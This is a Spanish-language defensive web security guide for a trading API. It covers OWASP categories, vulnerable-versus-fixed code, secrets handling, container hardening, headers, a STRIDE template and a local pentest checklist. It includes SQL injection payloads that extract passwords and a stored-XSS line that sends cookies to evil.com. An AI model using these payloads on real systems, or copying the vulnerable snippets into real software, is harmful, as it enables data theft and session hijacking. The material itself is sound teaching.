# Senior Security — Guia de Referencia Completa

Referencia de seguridad para aplicaciones web en produccion. Codigo vulnerable y su fix correcto, patrones por stack, y checklists accionables.

**IMPORTANTE:** Esta guia es para uso defensivo — para construir sistemas seguros y auditar tu propio codigo. Nunca usar estas tecnicas contra sistemas sin autorizacion explicita.

---

## 1. OWASP Top 10 2024 — Vision General

| Rank | Categoria | Descripcion breve |
|------|-----------|-------------------|
| A01 | Broken Access Control | Usuarios acceden a recursos de otros usuarios o funciones admin |
| A02 | Cryptographic Failures | Datos sensibles no encriptados, algoritmos debiles |
| A03 | Injection | SQL, NoSQL, OS Command, LDAP injection |
| A04 | Insecure Design | Falta de controles en el diseno arquitectonico |
| A05 | Security Misconfiguration | Configs por defecto, verbose errors, puertos abiertos |
| A06 | Vulnerable Components | Dependencias con CVEs conocidos |
| A07 | Authentication Failures | Passwords debiles, session management inseguro |
| A08 | Software Integrity Failures | Dependencias de fuentes no confiables, SSDLC |
| A09 | Logging Failures | Logs insuficientes, sin alertas, sin SIEM |
| A10 | SSRF | Requests a recursos internos desde el servidor |

---

## 2. SQL Injection — El Mas Clasico

### Codigo VULNERABLE (nunca hacer esto)

```python
# VULNERABLE — Concatenacion de string en SQL
# Un atacante puede enviar: symbol = "'; DROP TABLE orders; --"
async def get_orders_vulnerable(symbol: str, db: AsyncSession):
    query = f"SELECT * FROM orders WHERE symbol = '{symbol}'"  # PELIGRO
    result = await db.execute(text(query))
    return result.fetchall()

# VULNERABLE — f-string en filtro
@app.get("/api/orders")
async def list_orders(status: str = Query(...)):
    query = f"SELECT * FROM orders WHERE status = '{status}'"  # PELIGRO
    ...

# VULNERABLE — ORM con raw text sin parametros
async def search_users(email: str, db: AsyncSession):
    result = await db.execute(
        text(f"SELECT * FROM users WHERE email LIKE '%{email}%'")  # PELIGRO
    )
```

### Como se explota

```
# Payload de SQL injection basico
GET /api/orders?status=FILLED' OR '1'='1
# Retorna TODOS los ordenes de TODOS los usuarios

# Union-based injection para extraer datos
GET /api/orders?symbol=BTCUSDT' UNION SELECT username,password,NULL,NULL FROM users --
# Extrae usuarios y passwords de la tabla users

# Blind SQL injection — inferir datos caracter a caracter
GET /api/orders?id=1' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a' --
```

### Fix correcto — Parameterized queries

```python
# CORRECTO — Parameterized query con SQLAlchemy text()
async def get_orders_safe(symbol: str, db: AsyncSession):
    query = text("SELECT * FROM orders WHERE symbol = :symbol")
    result = await db.execute(query, {"symbol": symbol})  # Parametro separado
    return result.fetchall()

# CORRECTO — ORM (automaticamente seguro)
async def list_orders_safe(status: str, db: AsyncSession):
    result = await db.execute(
        select(Order).where(Order.status == status)  # SQLAlchemy escapa automaticamente
    )
    return result.scalars().all()

# CORRECTO — LIKE con parametro
async def search_users_safe(email_pattern: str, db: AsyncSession):
    # Escapar caracteres especiales de LIKE antes de parametrizar
    safe_pattern = email_pattern.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_")
    result = await db.execute(
        text("SELECT * FROM users WHERE email LIKE :pattern ESCAPE '\\'"),
        {"pattern": f"%{safe_pattern}%"}
    )
    return result.fetchall()

# CORRECTO — Pydantic para validacion de inputs antes de llegar a la DB
from pydantic import BaseModel, validator
import re

class OrderFilter(BaseModel):
    symbol: str
    status: str | None = None

    @validator("symbol")
    def validate_symbol(cls, v):
        if not re.match(r'^[A-Z]{2,10}USDT$', v):
            raise ValueError("Invalid symbol format")
        return v

    @validator("status")
    def validate_status(cls, v):
        allowed = {"PENDING", "FILLED", "CANCELLED", "REJECTED"}
        if v and v not in allowed:
            raise ValueError(f"Status must be one of: {allowed}")
        return v
```

### TypeScript / TypeORM — fix

```typescript
// VULNERABLE
const orders = await connection.query(
  `SELECT * FROM orders WHERE user_id = '${userId}'`  // PELIGRO
);

// CORRECTO — TypeORM con parametros posicionales
const orders = await connection.query(
  'SELECT * FROM orders WHERE user_id = $1', [userId]
);

// CORRECTO — TypeORM QueryBuilder (siempre escapa)
const orders = await connection
  .createQueryBuilder(Order, 'order')
  .where('order.userId = :userId', { userId })
  .andWhere('order.status = :status', { status })
  .getMany();

// CORRECTO — Repository pattern (mas seguro aun)
const orders = await orderRepository.find({
  where: { userId, status },
  order: { createdAt: 'DESC' },
  take: 20,
});
```

---

## 3. XSS — Cross-Site Scripting

Tres tipos: **Stored** (guardado en DB), **Reflected** (en URL/params), **DOM-based** (en JS del cliente).

### Stored XSS — Ejemplo y fix

```python
# VULNERABLE — Guardar HTML sin sanitizar
@app.post("/api/comments")
async def create_comment(content: str, user: User = Depends(get_current_user)):
    # El atacante envia: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
    comment = Comment(content=content, user_id=user.id)  # PELIGRO — HTML sin sanitizar
    db.add(comment)
```

```python
# CORRECTO — Sanitizar HTML con bleach o markupsafe
import bleach

ALLOWED_TAGS = ["b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li"]
ALLOWED_ATTRS = {"a": ["href", "title"]}

@app.post("/api/comments")
async def create_comment(content: str, user: User = Depends(get_current_user)):
    # Sanitizar antes de guardar
    safe_content = bleach.clean(
        content,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRS,
        strip=True  # Eliminar tags no permitidos en lugar de escaparlos
    )
    comment = Comment(content=safe_content, user_id=user.id)
    db.add(comment)
```

### DOM-based XSS en React

```typescript
// VULNERABLE — innerHTML con datos del usuario
function UserComment({ comment }: { comment: string }) {
  return (
    // PELIGRO: innerHTML ejecuta cualquier script en el string
    <div dangerouslySetInnerHTML={{ __html: comment }} />
  );
}

// CORRECTO — React escapa automaticamente con JSX
function UserComment({ comment }: { comment: string }) {
  return <div>{comment}</div>;  // Seguro — React escapa HTML automaticamente
}

// Si necesitas renderizar HTML confiable (de un editor rich text):
import DOMPurify from 'dompurify';

function TrustedContent({ html }: { html: string }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'target'],
  });
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// VULNERABLE — URL sin validar
function UserLink({ url }: { url: string }) {
  return <a href={url}>Click here</a>;  // Puede ser javascript:alert(1)
}

// CORRECTO — Validar protocolo de URLs
function UserLink({ url }: { url: string }) {
  const isValidUrl = (u: string) => {
    try {
      const parsed = new URL(u);
      return ['http:', 'https:'].includes(parsed.protocol);
    } catch {
      return false;
    }
  };

  if (!isValidUrl(url)) return <span>Invalid link</span>;
  return <a href={url} rel="noopener noreferrer" target="_blank">Click here</a>;
}
```

### Content Security Policy — Mitigacion en profundidad

```nginx
# nginx.conf — Headers de seguridad
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' 'nonce-{NONCE}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://cdn.example.com;
  connect-src 'self' wss://api.example.com https://api.binance.com;
  font-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
" always;
```

```python
# FastAPI — CSP con nonce para scripts inline
import secrets
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        nonce = secrets.token_urlsafe(16)
        request.state.csp_nonce = nonce

        response = await call_next(request)

        csp = (
            f"default-src 'self'; "
            f"script-src 'self' 'nonce-{nonce}'; "
            f"style-src 'self' 'unsafe-inline'; "
            f"img-src 'self' data:; "
            f"connect-src 'self' wss:; "
            f"frame-ancestors 'none'; "
            f"base-uri 'self'"
        )

        response.headers["Content-Security-Policy"] = csp
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"

        return response
```

---

## 4. CSRF — Cross-Site Request Forgery

CSRF ocurre cuando una pagina maliciosa hace requests a tu API usando las cookies del usuario.

### CSRF en FastAPI con Double Submit Cookie

```python
# src/middleware/csrf.py

import secrets
import hmac
import hashlib
from starlette.middleware.base import BaseHTTPMiddleware

CSRF_EXEMPT_METHODS = {"GET", "HEAD", "OPTIONS"}
CSRF_EXEMPT_PATHS = {"/api/auth/login", "/api/auth/register", "/api/v1/health"}

class CSRFMiddleware(BaseHTTPMiddleware):
    def __init__(self, app, secret: str):
        super().__init__(app)
        self.secret = secret.encode()

    def _generate_token(self) -> str:
        """Genera un token CSRF firmado con HMAC"""
        random_value = secrets.token_hex(32)
        signature = hmac.new(
            self.secret,
            random_value.encode(),
            hashlib.sha256
        ).hexdigest()
        return f"{random_value}.{signature}"

    def _verify_token(self, token: str) -> bool:
        """Verifica la firma del token sin timing attacks"""
        try:
            parts = token.split(".")
            if len(parts) != 2:
                return False
            random_value, signature = parts
            expected = hmac.new(
                self.secret,
                random_value.encode(),
                hashlib.sha256
            ).hexdigest()
            # compare_digest previene timing attacks
            return hmac.compare_digest(signature, expected)
        except Exception:
            return False

    async def dispatch(self, request: Request, call_next):
        # Metodos seguros no necesitan CSRF
        if request.method in CSRF_EXEMPT_METHODS:
            return await call_next(request)

        if request.url.path in CSRF_EXEMPT_PATHS:
            return await call_next(request)

        # Double Submit Cookie pattern
        cookie_token = request.cookies.get("csrf_token")
        header_token = request.headers.get("X-CSRF-Token")

        if not cookie_token or not header_token:
            return JSONResponse(
                status_code=403,
                content={"error": "csrf_missing", "message": "CSRF token required"}
            )

        # Verificar que ambos tokens son iguales Y validos
        if not self._verify_token(cookie_token) or cookie_token != header_token:
            return JSONResponse(
                status_code=403,
                content={"error": "csrf_invalid", "message": "Invalid CSRF token"}
            )

        return await call_next(request)

# Endpoint para obtener token CSRF (llamado al inicio de la sesion)
@app.get("/api/auth/csrf-token")
async def get_csrf_token(response: Response):
    token = csrf_middleware._generate_token()
    response.set_cookie(
        key="csrf_token",
        value=token,
        httponly=False,   # Debe ser readable por JS para el Double Submit pattern
        secure=True,
        samesite="strict",
        max_age=3600
    )
    return {"csrf_token": token}
```

### CSRF en NestJS

```typescript
// src/middleware/csrf.middleware.ts
import { Injectable, NestMiddleware, ForbiddenException } from '@nestjs/common';
import { Request, Response, NextFunction } from 'express';
import * as crypto from 'crypto';

@Injectable()
export class CsrfMiddleware implements NestMiddleware {
  private readonly SAFE_METHODS = new Set(['GET', 'HEAD', 'OPTIONS']);

  use(req: Request, res: Response, next: NextFunction) {
    if (this.SAFE_METHODS.has(req.method)) {
      return next();
    }

    const cookieToken = req.cookies?.['csrf_token'];
    const headerToken = req.headers['x-csrf-token'];

    if (!cookieToken || !headerToken) {
      throw new ForbiddenException('CSRF token required');
    }

    if (!crypto.timingSafeEqual(
      Buffer.from(cookieToken as string),
      Buffer.from(headerToken as string)
    )) {
      throw new ForbiddenException('Invalid CSRF token');
    }

    next();
  }
}

// Frontend — axios interceptor para CSRF automatico
// src/services/api.ts
import axios from 'axios';

// Obtener token al inicio
async function fetchCsrfToken() {
  const response = await axios.get('/api/auth/csrf-token', { withCredentials: true });
  return response.data.csrf_token;
}

let csrfToken: string | null = null;

axios.interceptors.request.use(async (config) => {
  if (['post', 'put', 'patch', 'delete'].includes(config.method?.toLowerCase() || '')) {
    if (!csrfToken) {
      csrfToken = await fetchCsrfToken();
    }
    config.headers['X-CSRF-Token'] = csrfToken;
  }
  return config;
});

// Renovar token si expiro (403 CSRF)
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 403 && error.response?.data?.error === 'csrf_invalid') {
      csrfToken = await fetchCsrfToken();
      // Reintentar la request original
      error.config.headers['X-CSRF-Token'] = csrfToken;
      return axios(error.config);
    }
    return Promise.reject(error);
  }
);
```

**Nota:** Si tu API solo acepta `Content-Type: application/json` y no usa cookies para auth (sino Bearer token en header), CSRF no es una amenaza — los browsers no pueden hacer cross-origin requests con JSON content type. Sin embargo, si usas cookies HttpOnly para sesiones, CSRF es critico.

---

## 5. Authentication Failures — JWT Security

### Vulnerabilidades comunes en JWT

```python
# VULNERABLE 1: Secret debil (bruteforceable)
JWT_SECRET = "secret"       # Trivial
JWT_SECRET = "myapp"        # Trivial
JWT_SECRET = "12345678"     # Trivial

# CORRECTO: Al menos 256 bits de entropia
import secrets
JWT_SECRET = secrets.token_hex(32)  # 256 bits — generar en setup, guardar en .env

# VULNERABLE 2: Algorithm "none" — permite tokens sin firma
# Un atacante puede crear tokens validos cambiando el header
import jwt
token = jwt.decode(token_str, options={"verify_signature": False})  # PELIGRO

# CORRECTO: Especificar algoritmo explicitamente
token = jwt.decode(token_str, secret, algorithms=["HS256"])  # Solo HS256

# VULNERABLE 3: No verificar la expiracion
payload = jwt.decode(token, secret, options={"verify_exp": False})  # PELIGRO

# CORRECTO: Verificar siempre (es el comportamiento por defecto en PyJWT)
payload = jwt.decode(token, secret, algorithms=["HS256"])  # Verifica exp automaticamente

# VULNERABLE 4: Token en localStorage (XSS puede robarlo)
# Frontend:
localStorage.setItem('token', access_token);  # Riesgo de robo via XSS

# MEJOR: Access token en memoria, refresh token en HttpOnly cookie
# El access token vive en memoria (se pierde al recargar)
# El refresh token en cookie HttpOnly (inaccesible a JS)

# VULNERABLE 5: JWT con datos sensibles
payload = {
    "sub": user_id,
    "email": email,
    "password_hash": user.password_hash,  # NUNCA en JWT
    "credit_card": user.card_number,       # NUNCA en JWT
}
# JWT no esta encriptado — solo firmado. Cualquiera puede decodificar el payload
# (no pueden modificarlo sin invalidar la firma, pero pueden leerlo)

# CORRECTO: Solo datos no sensibles en JWT
payload = {
    "sub": str(user_id),
    "role": user.role,
    "email": user.email,  # OK si no es sensible en tu contexto
    "jti": str(uuid4()),
    "exp": datetime.utcnow() + timedelta(minutes=15),
    "iat": datetime.utcnow(),
}
```

### Storage seguro de tokens en el frontend

```typescript
// src/services/token-storage.ts

// Estrategia: Access token en memoria, Refresh en HttpOnly cookie (gestionada por el servidor)

class SecureTokenStorage {
  private accessToken: string | null = null;
  private refreshPromise: Promise<string> | null = null;

  setAccessToken(token: string) {
    this.accessToken = token;
    // NO guardar en localStorage ni sessionStorage
  }

  getAccessToken(): string | null {
    return this.accessToken;
  }

  clearTokens() {
    this.accessToken = null;
    // El refresh token en la cookie HttpOnly se limpia en el backend con /api/auth/logout
  }

  async refreshAccessToken(): Promise<string> {
    // Evitar multiples refreshes simultaneos
    if (this.refreshPromise) {
      return this.refreshPromise;
    }

    this.refreshPromise = (async () => {
      try {
        // El refresh token se envia automaticamente en la cookie HttpOnly
        const response = await fetch('/api/auth/refresh', {
          method: 'POST',
          credentials: 'include',  // Importante: incluir cookies
        });

        if (!response.ok) {
          this.clearTokens();
          window.location.href = '/login';
          throw new Error('Refresh failed');
        }

        const data = await response.json();
        this.setAccessToken(data.access_token);
        return data.access_token;
      } finally {
        this.refreshPromise = null;
      }
    })();

    return this.refreshPromise;
  }
}

export const tokenStorage = new SecureTokenStorage();
```

---

## 6. Secrets Management

### Regla de oro: Los secrets NUNCA van en el codigo

```python
# VULNERABLE — Secret en codigo
DATABASE_URL = "postgresql://admin:mysecretpassword@db:5432/trading"  # PELIGRO
API_KEY = "sk-binance-abcdef123456"  # PELIGRO
JWT_SECRET = "my-super-secret"       # PELIGRO

# CORRECTO — Leer de variables de entorno
import os
from pydantic_settings import BaseSettings

class Settings(BaseSettings):
    DATABASE_URL: str              # Obligatorio — falla si no existe
    JWT_SECRET: str                # Obligatorio
    BINANCE_API_KEY: str           # Obligatorio
    BINANCE_SECRET_KEY: str        # Obligatorio
    REDIS_URL: str = "redis://localhost:6379"  # Con default

    # Pydantic valida que esten presentes al iniciar
    model_config = {"env_file": ".env", "env_file_encoding": "utf-8"}

settings = Settings()
```

### .env.example — Template para el equipo

```bash
# .env.example — COMMIT ESTO en el repo
# .env — NUNCA commitear (agregar a .gitignore)

# Database
DATABASE_URL=postgresql+asyncpg://user:password@localhost:5432/trading_dev
POSTGRES_USER=trading_user
POSTGRES_PASSWORD=change_me_in_production
POSTGRES_DB=trading_dev

# Security
JWT_SECRET=generate_with_openssl_rand_hex_32
JWT_ACCESS_TOKEN_EXPIRE_MINUTES=15
JWT_REFRESH_TOKEN_EXPIRE_DAYS=30

# Binance (testnet para dev)
BINANCE_API_KEY=your_testnet_api_key
BINANCE_SECRET_KEY=your_testnet_secret_key
BINANCE_TESTNET=true

# Redis
REDIS_URL=redis://localhost:6379

# Environment
ENV=development
DEBUG=false
ALLOWED_ORIGINS=http://localhost:5173,http://localhost:3000
```

```bash
# .gitignore — siempre incluir
.env
.env.local
.env.production
*.pem
*.key
*.p12
*.pfx
secrets/
credentials/
```

### Detectar secrets accidentalmente commiteados

```bash
# Instalar git-secrets o gitleaks para prevencion pre-commit
brew install gitleaks

# Escanear el repo completo por secrets
gitleaks detect --source . --report-format json --report-path gitleaks-report.json

# Pre-commit hook
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.4
    hooks:
      - id: gitleaks

# Si encontramos un secret commiteado:
# 1. Invalidar el secret INMEDIATAMENTE en el proveedor
# 2. Rotar las credenciales
# 3. Usar git filter-repo para limpiar el historial:
pip install git-filter-repo
git filter-repo --path .env --invert-paths
# 4. Force push (coordinar con el equipo)
# 5. Notificar si fue expuesto en un repo publico
```

### HashiCorp Vault — Para produccion real

```python
# src/config/vault.py — Leer secrets de Vault en produccion

import hvac
from functools import lru_cache

@lru_cache()
def get_vault_client() -> hvac.Client:
    client = hvac.Client(url="https://vault.internal.example.com")
    client.auth.approle.login(
        role_id=os.environ["VAULT_ROLE_ID"],
        secret_id=os.environ["VAULT_SECRET_ID"]
    )
    return client

def get_secret(path: str) -> dict:
    client = get_vault_client()
    secret = client.secrets.kv.v2.read_secret_version(path=path)
    return secret["data"]["data"]

# Uso al iniciar la aplicacion
def load_secrets_from_vault():
    if os.environ.get("ENV") == "production":
        secrets = get_secret("trading-bot/production")
        os.environ["DATABASE_URL"] = secrets["database_url"]
        os.environ["JWT_SECRET"] = secrets["jwt_secret"]
        os.environ["BINANCE_API_KEY"] = secrets["binance_api_key"]
```

---

## 7. Dependencies Audit — Mantener dependencias seguras

```bash
# Python — pip-audit
pip install pip-audit
pip-audit                          # Auditar dependencias actuales
pip-audit -r requirements.txt     # Auditar requirements especifico
pip-audit --fix                   # Auto-fix si es posible (con cuidado)

# Generar SBOM (Software Bill of Materials)
pip install cyclonedx-bom
cyclonedx-py -r requirements.txt -o sbom.xml

# Node.js — npm audit
npm audit                          # Listar vulnerabilidades
npm audit --audit-level=high      # Solo high/critical
npm audit fix                     # Fix automatico (sin breaking changes)
npm audit fix --force             # Fix con breaking changes (revisar manualmente)

# Generar SBOM en Node
npm install -g @cyclonedx/cyclonedx-npm
cyclonedx-npm --output-file sbom.json

# GitHub Dependabot — activar en repositorios
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "pip"
    directory: "/backend"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"

  - package-ecosystem: "npm"
    directory: "/frontend"
    schedule:
      interval: "weekly"

# CI/CD — bloquear builds con vulnerabilidades criticas
# .github/workflows/security.yml
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Python security audit
        run: |
          pip install pip-audit
          pip-audit -r backend/requirements.txt --fail-on-severity high
      - name: Node security audit
        run: |
          cd frontend
          npm audit --audit-level=high
```

---

## 8. Container Security — Dockerfile Best Practices

```dockerfile
# Dockerfile INSEGURO — anti-patterns
FROM ubuntu:latest          # No pinear version
RUN apt-get install -y sudo  # Instalar sudo en container es innecesario
COPY . .                     # Copiar TODO incluyendo .env, .git, etc.
RUN pip install -r requirements.txt
CMD ["python", "main.py"]   # Sin usuario — corre como root!
```

```dockerfile
# Dockerfile SEGURO — production-ready

# === STAGE 1: Builder ===
FROM python:3.12-slim AS builder

# No instalar herramientas innecesarias
RUN apt-get update && apt-get install -y --no-install-recommends \
    build-essential \
    libpq-dev \
    && rm -rf /var/lib/apt/lists/*  # Limpiar cache de apt

WORKDIR /app

# Copiar solo requirements primero (aprovechar Docker cache)
COPY requirements.txt .
RUN pip install --no-cache-dir --upgrade pip && \
    pip install --no-cache-dir -r requirements.txt

# === STAGE 2: Runtime (imagen minima) ===
FROM python:3.12-slim AS runtime

# Instalar solo dependencias de runtime
RUN apt-get update && apt-get install -y --no-install-recommends \
    libpq5 \
    curl \  # Para healthcheck
    && rm -rf /var/lib/apt/lists/*

# Crear usuario no-root
RUN groupadd --gid 1001 appgroup && \
    useradd --uid 1001 --gid 1001 --no-create-home --shell /bin/false appuser

WORKDIR /app

# Copiar dependencias del builder
COPY --from=builder /usr/local/lib/python3.12/site-packages /usr/local/lib/python3.12/site-packages
COPY --from=builder /usr/local/bin /usr/local/bin

# Copiar solo el codigo necesario — NO copiar .env, tests, docs
COPY src/ ./src/
COPY alembic.ini .
COPY alembic/ ./alembic/

# Cambiar ownership
RUN chown -R appuser:appgroup /app

# Cambiar a usuario no-root
USER appuser

# Readonly filesystem donde sea posible
# (el codigo no deberia escribir en disco en produccion)
RUN chmod -R 555 /app/src

# Healthcheck
HEALTHCHECK --interval=30s --timeout=10s --start-period=15s --retries=3 \
    CMD curl -f http://localhost:8000/api/v1/health || exit 1

# No usar CMD con shell — usar exec form
ENTRYPOINT ["python", "-m", "uvicorn"]
CMD ["src.main:app", "--host", "0.0.0.0", "--port", "8000", "--workers", "4"]
```

```yaml
# docker-compose.yml — configuracion de seguridad
services:
  api:
    build: ./backend
    security_opt:
      - no-new-privileges:true    # No elevar privilegios
    read_only: true               # Filesystem readonly
    tmpfs:
      - /tmp                      # Carpeta tmp en memoria
    cap_drop:
      - ALL                       # Eliminar todas las capabilities Linux
    cap_add:
      - NET_BIND_SERVICE          # Solo agregar lo necesario
    environment:
      # NUNCA poner secrets directamente
      - DATABASE_URL_FILE=/run/secrets/db_url  # Leer de Docker secrets
    secrets:
      - db_url
    networks:
      - internal                  # Red interna (no expuesto directamente)
    expose:
      - "8000"                    # Solo exponer internamente
    # ports: "8000:8000"          # Commented out — nginx es el punto de entrada

  nginx:
    image: nginx:alpine
    ports:
      - "443:443"
      - "80:80"
    networks:
      - internal
      - external

secrets:
  db_url:
    file: ./secrets/db_url.txt   # En produccion usar Docker Swarm secrets o K8s secrets

networks:
  internal:
    internal: true
  external:
```

### Escanear imagen con Trivy

```bash
# Instalar Trivy
brew install trivy

# Escanear imagen local
trivy image trading-api:latest

# Escanear con fail en vulnerabilidades HIGH/CRITICAL
trivy image --exit-code 1 --severity HIGH,CRITICAL trading-api:latest

# En CI/CD
trivy image --format sarif --output trivy-results.sarif trading-api:latest
```

---

## 9. Security Headers Checklist

```nginx
# nginx.conf — configuracion completa de headers de seguridad

server {
    listen 443 ssl http2;

    # TLS — configuracion moderna
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
    ssl_session_timeout 1d;
    ssl_session_cache shared:MozSSL:10m;
    ssl_stapling on;
    ssl_stapling_verify on;

    # HSTS — forzar HTTPS por 1 año, incluyendo subdominios
    # IMPORTANTE: No activar hasta estar seguro de que HTTPS funciona correctamente
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    # Prevenir clickjacking
    add_header X-Frame-Options "DENY" always;

    # Prevenir MIME type sniffing
    add_header X-Content-Type-Options "nosniff" always;

    # Controlar informacion del referrer
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # Deshabilitar features no necesarias
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;

    # CSP — ajustar segun las necesidades de tu app
    add_header Content-Security-Policy "
        default-src 'self';
        script-src 'self';
        style-src 'self' 'unsafe-inline';
        img-src 'self' data: https:;
        connect-src 'self' wss://api.example.com;
        font-src 'self';
        frame-ancestors 'none';
        base-uri 'self';
        form-action 'self';
        upgrade-insecure-requests;
    " always;

    # Ocultar version de nginx
    server_tokens off;

    # Evitar revelar tecnologia backend
    proxy_hide_header X-Powered-By;
    proxy_hide_header Server;
}

# Redireccion HTTP → HTTPS
server {
    listen 80;
    return 301 https://$host$request_uri;
}
```

### Verificacion rapida de headers

```bash
# Verificar headers de seguridad
curl -I https://tuapp.com | grep -E "(strict|x-frame|x-content|csp|referrer|permissions)"

# Usar securityheaders.com para reporte completo
# O Mozilla Observatory: observatory.mozilla.org
```

---

## 10. Threat Modeling con STRIDE — Template

```markdown
## Threat Model: [Nombre del Sistema/Feature]

**Fecha:** YYYY-MM-DD
**Analistas:** [nombres]
**Version del sistema:** x.x.x

### 1. Scope

Describir los componentes incluidos en el analisis.

**Data Flow:**
[Cliente] → [API Gateway] → [OrderService] → [PostgreSQL]
                         ↓
                    [BinanceAPI]

**Assets a proteger:**
- Fondos del usuario (USDT balance)
- Credenciales de la cuenta Binance del usuario
- Datos personales (email, datos KYC)
- Configuracion de estrategias de trading

**Actores:**
- Usuario legitimo
- Atacante externo (sin cuenta)
- Atacante interno (con cuenta de usuario normal)
- Insider (empleado con acceso)

### 2. Analisis STRIDE por Componente

#### API Gateway (FastAPI)

| ID | Amenaza | Categoria | Prob | Impacto | Puntuacion | Mitigacion |
|----|---------|-----------|------|---------|------------|------------|
| T01 | JWT robado por XSS usado para hacer trades | Spoofing | M | A | 15 | Access token en memoria, HttpOnly cookie para refresh |
| T02 | Modificar payload de orden en transito (MitM) | Tampering | B | A | 10 | HTTPS/TLS 1.3, certificate validation |
| T03 | Usuario niega haber colocado orden | Repudiation | M | M | 9 | Audit log con IP, timestamp, jti del JWT |
| T04 | Listar ordenes de otro usuario | Info Disclosure | M | A | 15 | WHERE user_id = current_user.id en TODAS las queries |
| T05 | DDoS en endpoint /api/orders | Denial of Service | A | A | 20 | Rate limiting, WAF, CAPTCHA para anomalias |
| T06 | User normal accede a /api/admin | Elevation of Privilege | B | C | 12 | RBAC estricto, unit tests de autorizacion |

**Puntuacion = Probabilidad (B=1, M=3, A=5) × Impacto (B=1, M=3, A=5, C=9)**

#### Base de Datos (PostgreSQL)

| ID | Amenaza | Categoria | Prob | Impacto | Puntuacion | Mitigacion |
|----|---------|-----------|------|---------|------------|------------|
| T07 | SQL injection para exfiltrar datos | Injection | M | C | 27 | ORM/parameterized queries, principio de minimo privilegio en DB user |
| T08 | Backup no encriptado expuesto | Info Disclosure | B | A | 15 | Encrypt backups con AES-256, S3 server-side encryption |
| T09 | DB accesible desde internet | Info Disclosure | B | C | 9 | DB en red privada, solo accesible desde la app |

### 3. Risk Matrix

```
Impacto →    Bajo    Medio   Alto   Critico
Prob Alta  |  5   |  15   |  25  |  45   |
Prob Media |  3   |   9   |  15  |  27   |
Prob Baja  |  1   |   3   |   5  |   9   |
```

**Umbrales:**
- >= 20: Critico — bloquear release hasta mitigar
- 10-19: Alto — mitigar en el sprint actual
- 5-9:  Medio — planificar mitigacion
- < 5:  Bajo — aceptar o mitigar a largo plazo

### 4. Plan de Mitigacion

| ID    | Amenaza               | Accion                          | Responsable | Deadline  | Estado |
|-------|-----------------------|----------------------------------|-------------|-----------|--------|
| T05   | DDoS /api/orders      | Implementar rate limiting 10req/s | Backend     | Sprint 12 | Pendiente |
| T01   | JWT en localStorage   | Migrar a memory + HttpOnly cookie | Frontend    | Sprint 12 | En progreso |
| T07   | SQL injection         | Audit de todas las queries raw    | Backend     | Sprint 11 | Completado |
```

---

## 11. Penetration Testing Checklist — Lo que Claude puede hacer

Estas verificaciones son de caja blanca (con acceso al codigo) para auditar tu propio sistema.

### Autenticacion y Sesiones

```bash
# 1. Verificar que el JWT usa algoritmo seguro
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xxxxx.yyy" | cut -d. -f1 | base64 -d
# Debe mostrar {"alg":"HS256","typ":"JWT"} — alertar si alg es "none" o RS256 con clave publica

# 2. Verificar que tokens expirados son rechazados
# Crear un token con exp en el pasado y intentar usarlo
python3 -c "
import jwt, datetime
expired_token = jwt.encode(
    {'sub': 'user_id', 'exp': datetime.datetime(2020, 1, 1)},
    'any_secret', algorithm='HS256'
)
print(expired_token)
"
curl -H "Authorization: Bearer <expired_token>" http://localhost:8000/api/orders
# Debe retornar 401

# 3. Verificar que refresh token rotation funciona
# Usar el mismo refresh token dos veces — la segunda debe fallar Y revocar la familia
```

### Inyecciones

```bash
# 4. SQL injection en parametros de query
curl "http://localhost:8000/api/orders?symbol=BTCUSDT%27%20OR%20%271%27%3D%271"
# Debe retornar 422 (validation error) o 200 con solo los datos del usuario, nunca todos los datos

# 5. SQL injection en IDs
curl "http://localhost:8000/api/orders/1%27%20UNION%20SELECT%20username%2Cpassword%2CNULL%2CNULL%20FROM%20users--"
# Debe retornar 422 o 404 (UUID validation fallara)

# 6. XSS en campos de texto
curl -X POST http://localhost:8000/api/comments \
  -H "Content-Type: application/json" \
  -d '{"content": "<script>alert(1)</script>"}'
# La respuesta NO debe contener el script sin escapar
```

### Autorizacion (IDOR — Insecure Direct Object Reference)

```bash
# 7. Acceso a recursos de otro usuario
# Como usuario A, intentar acceder al orden del usuario B
curl -H "Authorization: Bearer <token_user_A>" \
     http://localhost:8000/api/orders/<order_id_of_user_B>
# Debe retornar 404 (no 403 — no revelar que el recurso existe)

# 8. Escalar privilegios cambiando el role en el JWT
# Decodificar un JWT de usuario normal, cambiar role a "admin", re-firmar con secreto conocido
# (Esta prueba solo aplica si el secreto es debil o conocido)
```

### Configuracion

```bash
# 9. Verificar que no hay endpoints de debug activos en prod
curl http://localhost:8000/api/debug
curl http://localhost:8000/api/admin/users  # sin token
curl http://localhost:8000/__debug__

